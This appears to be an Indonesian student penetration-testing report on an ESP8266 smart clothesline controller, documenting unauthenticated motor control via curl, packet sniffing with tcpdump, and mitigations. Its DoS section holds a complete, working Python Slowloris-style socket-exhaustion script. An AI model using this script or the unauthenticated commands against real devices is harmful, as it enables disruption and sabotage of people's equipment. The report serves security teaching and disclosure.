# Penetration Testing: Kontrol Jemuran Otomatis (ESP8266)

---

## 👥 Anggota Kelompok II

| No | Nama                         | NIM            |
|----|------------------------------|----------------|
| 1  | **Bintang Darmawan**         | 09030282327017 |
| 2  | **Hana Zakiyah Nur Aliyah**  | 09030282327053 |
| 3  | **Niken Carolin**            | 09030282327071 |
| 4  | **Sania Apriza**             | 09030282327059 |
| 5  | **Ario Faturrahmat**         | 09030282327074 |
| 6  | **Seftiana Safutri**         | 09030282327056 |

---

## Latar Belakang & Tujuan
Proyek ini bertujuan untuk menguji keamanan antarmuka kontroler yang berfungsi menggerakkan motor jemuran otomatis. Perangkat ini dirancang untuk efisiensi rumah tangga dengan menarik jemuran saat hujan turun menggunakan sensor cuaca. 

**Tujuan Pengujian (Graybox Method):**
1. Memetakan jaringan lokal untuk menemukan perangkat target menggunakan protokol ARP dan scanning port.
2. Menguji celah **Broken Access Control** pada API kontrol motor.
3. Menguji ketahanan server terhadap serangan **Denial of Service (DoS)** tipe Socket Exhaustion.
4. Membuktikan kerentanan privasi melalui **Network Sniffing**.

---

## Deskripsi Perangkat (Smart Clothesline)

Sebelum masuk ke pengujian keamanan, berikut adalah gambaran umum perangkat keras yang digunakan.

### 1. Cara Kerja
Sistem bekerja secara otomatis maupun manual:

* **Sensor Hujan:** Mendeteksi air hujan untuk memicu motor menarik jemuran.
* **Limit Switch:** Keamanan posisi motor agar tidak berputar melebihi batas.
* **Web Emergency Panel:** Fitur kendali manual via WiFi (Port 80) jika internet utama terputus.

### 2. Komponen Utama
Berikut adalah komponen yang membangun sistem ini:

| Komponen                    | Fungsi                                                                 |
| :-------------------------- | :---------------------------------------------------------------------- |
| **ESP8266 (NodeMCU/Wemos)** | Mikrokontroler utama yang terhubung ke Wi-Fi dan Web Server.           |
| **Motor DC 755**                | Aktuator untuk menarik dan mengulur tali jemuran.                      |
| **Rain Sensor**             | Mendeteksi kondisi cuaca (hujan/cerah).                                |
| **Web Interface**           | Dashboard "Emergency Web Panel" pada Port 80 untuk kendali manual.     |


---

## 🎯 Target Pengujian

Bagian ini berfokus pada sisi *software* dan *network* yang berjalan di atas perangkat keras tersebut.

* **Perangkat:** ESP8266 Web Server (Jemuran Otomatis)
* **Fitur Web:** Emergency Control Panel (Maju, Mundur, Stop)
* **IP Target:** `10.185.29.155` (berdasarkan hasil scanning ARP)
* **Port Terbuka:** 80/tcp (HTTP)

**Deskripsi Web Service:**  
Web service menyediakan antarmuka sederhana yang memungkinkan pengguna mengirim perintah ke motor tanpa mekanisme login yang memadai.

| Tampilan Web Panel (Normal) | Hasil Scanning Port (Nmap) |
| :-------------------------: | :-------------------------: |
| <img src="https://github.com/user-attachments/assets/2563874a-8191-41b6-96c5-41c90a157dde" width="100%" alt="Tampilan Web Panel"> | <img src="https://github.com/user-attachments/assets/abb6a74d-83c8-403f-a3c8-2cf220dd98a4" width="100%" alt="Hasil Nmap"> |
| *Antarmuka Kendali Manual* | *Port 80 HTTP Open* |

---

## 🛠️ Tools & Lingkungan Pengujian
Pengujian dilakukan menggunakan sistem operasi **Kali Linux** (`10.185.29.164`) dengan tools berikut: 
1.  **Arp-scan / Nmap:** Untuk penemuan perangkat dan pemindaian port (*Reconnaissance*).
2.  **cURL:** Untuk memanipulasi permintaan HTTP dan bypass antarmuka web.
3.  **Tcpdump:** Untuk penyadapan (*sniffing*) lalu lintas jaringan.
4.  **Python Script:** Custom script untuk melakukan stress-testing (DoS).

---

## ⚔️ Kerentanan 1: Authentication Bypass (IDOR)

### Apa itu IDOR?
**Insecure Direct Object Reference (IDOR)** atau dalam kasus ini *Broken Access Control*, terjadi ketika aplikasi memberikan akses ke fungsi perangkat keras (motor) berdasarkan input pengguna tanpa memvalidasi otorisasi. Pada perangkat ini, API endpoint `/action` terekspos tanpa proteksi password. 

### 🚀 Langkah-Langkah Pengujian

#### 1. Analisis Struktur HTML
Pengujian dilakukan langsung dengan mengirim permintaan HTTP manual menggunakan cURL, ditemukan bahwa tombol kontrol memanggil endpoint berikut: 
* `href="/action?go=maju"`
* `href="/action?go=mundur"`
* `href="/action?go=stop"`

| Hasil cURL  | 
|---------------------------|
| <img src="https://github.com/user-attachments/assets/ffebd5de-05b7-42bc-bd4c-8ddef199563c" width="100%" /> |


#### 2. Eksekusi Serangan (cURL)
Penyerang tidak perlu membuka browser. Cukup menggunakan terminal untuk mengirim perintah langsung ke mikrokontroler. 
**Command:**
```bash
curl "[http://10.185.29.155/action?go=maju](http://10.185.29.155/action?go=maju)"   
```
| Eksekusi cURL pada ESP8266 |
|----------------------------|
| <img src="https://github.com/user-attachments/assets/836f9d78-22fc-461d-8151-13d7c5f68c90" width="100%"> |



#### 3. Hasil
Perintah diterima dan motor bergerak tanpa autentikasi. Sistem tidak memeriksa apakah pengirim adalah pengguna sah, hanya mengeksekusi parameter `go`.


| Hasil Bypass pada Alat |
|----------------------------|
|<img width="855" height="386" alt="image" src="https://github.com/user-attachments/assets/2ade9f55-6919-4630-b47a-6591055d3c1c" />|



**Dampak:**  
Penyerang yang berada dalam jaringan yang sama dapat menggerakkan motor kapan saja, termasuk pada kondisi yang berpotensi merusak perangkat (misalnya memaksa motor bergerak saat limit switch mencapai batas).

---

## ⚔️ Kerentanan 2: Denial of Service (DoS)

### Apa itu Denial of Service (DoS)?
Serangan Denial of Service (DoS) adalah upaya membuat layanan tidak dapat diakses dengan membanjiri atau menghabiskan sumber daya sistem. Pada perangkat IoT kecil seperti ESP8266, sumber daya utama yang biasanya diserang adalah jumlah socket/koneksi aktif. Ketika semua slot koneksi penuh, perangkat berhenti merespons, melakukan restart internal, atau hanya menggantung.

### Ringkasan
Web server bawaan ESP8266 hanya menyediakan beberapa slot koneksi berskala kecil (umumnya 4–8 tergantung firmware). Tidak ada rate limiting, tidak ada proteksi flood, dan timeout koneksi default sering terlalu lama. Akibatnya, penyerang dapat membuka banyak koneksi HTTP secara cepat, membiarkannya menggantung (semi-open), lalu menghabiskan seluruh pool socket. Ketika ini terjadi, perangkat tidak bisa menerima permintaan baru dari pengguna sah.

### Langkah Pengujian

#### 1. Pembuatan Script Flooding
Sebuah script Python sederhana digunakan untuk membuka koneksi HTTP tanpa menutupnya.

```python
import socket
import time
import threading
import sys

# CONFIGURATION
TARGET_IP = "10.185.29.155"  # Your ESP8266 IP
TARGET_PORT = 80             # The Web Server Port
MAX_SOCKETS = 200            # Overkill (ESP dies at ~5)

sockets = []

def init_socket():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(4)
        s.connect((TARGET_IP, TARGET_PORT))
        # We send a partial HTTP header to keep the server waiting
        s.send("GET /? HTTP/1.1\r\n".encode("utf-8"))
        s.send(f"Host: {TARGET_IP}\r\n".encode("utf-8"))
        # DO NOT send \r\n\r\n (End of request). Keep it hanging.
        return s
    except socket.error:
        return None

def main():
    print(f"--- STARTING SOCKET EXHAUSTION ATTACK ON {TARGET_IP} ---")
    
    # 1. Fill up the slots
    for i in range(MAX_SOCKETS):
        print(f"[*] Opening Socket #{i+1}...", end=" ")
        s = init_socket()
        if s:
            print("CONNECTED. (Holding line open)")
            sockets.append(s)
        else:
            print("FAILED. (Server likely dead/full)")
            # If we fail to connect, it means the server is DoS'd
            break
        
    print(f"\n[SUCCESS] Server is full with {len(sockets)} active zombies.")
    print("[-] The device should now be unresponsive.")
    print("[-] Press Ctrl+C to stop the attack and release the sockets.")

    # 2. Keep them alive
    while True:
        try:
            time.sleep(10)
            # Send tiny keep-alive data to prevent timeout
            for s in sockets:
                try:
                    s.send("X-a: b\r\n".encode("utf-8"))
                except socket.error:
                    pass 
        except KeyboardInterrupt:
            print("\n[STOP] Release sockets...")
            break

if __name__ == "__main__":
    main()
```

#### 2. Hasil
Setelah beberapa detik, web server berhenti merespons. Browser menampilkan **Connection timed out**, dan cURL gagal menjalin koneksi baru.

| Eksekusi Serangan DoS | Hasil Serangan DoS pada Sistem |
|------------------------|-------------------------------|
| <img src="https://github.com/user-attachments/assets/0d824a1a-1997-4517-811a-548808e06d3e" width="100%"> | <img src="https://github.com/user-attachments/assets/219db9bc-1dd8-4743-9808-cf1246a487d5" width="100%"> |

**Dampak:**  
Penyerang dapat membuat panel kontrol tidak dapat diakses pengguna sah, sehingga mengganggu fungsi sistem.

---

## ⚔️ Kerentanan 3: Network Sniffing 

### Apa itu Network Sniffing?
Network sniffing adalah teknik observasi lalu lintas jaringan secara pasif untuk melihat paket yang lewat apa adanya. Jika suatu layanan menggunakan protokol tanpa enkripsi, isi paket bisa dibaca langsung: header, parameter, bahkan payload kontrol. Tidak perlu akses istimewa; cukup berada di jaringan yang sama.

Pada perangkat ini, seluruh komunikasi dikirim melalui HTTP port 80 tanpa enkripsi. Akibatnya, traffic ke endpoint kontrol motor dapat ditangkap dan dibaca secara utuh, termasuk perintah yang menggerakkan perangkat keras.

### Langkah Pengujian

#### 1. Menjalankan Tcpdump

```bash
sudo tcpdump -i eth0 -nn -A host 10.185.29.155
```
Parameter -A membuat isi paket ditampilkan dalam bentuk ASCII, sehingga request HTTP terlihat jelas tanpa perlu decoding tambahan.

#### 2. Hasil
Permintaan ke endpoint `/action?go=maju` muncul dalam bentuk teks biasa, termasuk parameter kontrol.


| Hasil Sniffing |
|----------------------------|
|<img width="1314" height="562" alt="image" src="https://github.com/user-attachments/assets/9dad1512-3819-4ac6-9d2f-992238c0cf7f" />|


**Dampak:**  
Aktor pasif dalam jaringan dapat mengetahui kapan pengguna menekan tombol dan dapat meniru permintaan tersebut.

---

## 🔍 Ringkasan Kerentanan

| Kerentanan                    | Dampak Utama                                          | Tingkat Risiko |
|------------------------------|--------------------------------------------------------|----------------|
| Authentication Bypass (IDOR) | Motor dapat dikendalikan pihak tidak sah               | Tinggi         |
| DoS: Socket Exhaustion       | Panel kontrol tidak tersedia bagi pengguna sah         | Sedang-Tinggi  |
| Sniffing (No Encryption)     | Data perintah dapat dicuri dan dipalsukan              | Sedang         |

---

## 📌 Kesimpulan

ESP8266 pada konfigurasi default tidak dirancang untuk menghadapi ancaman jaringan lokal yang agresif. Tanpa autentikasi, tanpa enkripsi, dan tanpa manajemen koneksi, perangkat sangat mudah dieksploitasi. Hasil pengujian menunjukkan seluruh fungsi kritis bisa diambil alih atau dilumpuhkan oleh pihak yang berada pada jaringan yang sama.  

---

## 🛡️ Saran Mitigasi

1. **Tambah Autentikasi:** Gunakan token, sesi, atau minimal password untuk endpoint sensitif.  
2. **Implementasi Rate Limiting:** Tutup koneksi idle dan batasi jumlah koneksi simultan.  
3. **Gunakan HTTPS atau WPA2-Enterprise:** Jika HTTPS tidak memungkinkan, pastikan jaringan terisolasi.  
4. **Validasi Input:** Batasi nilai parameter `go` hanya pada daftar perintah valid.  
5. **Segregasi Jaringan:** Tempatkan perangkat IoT pada VLAN atau segmen khusus.
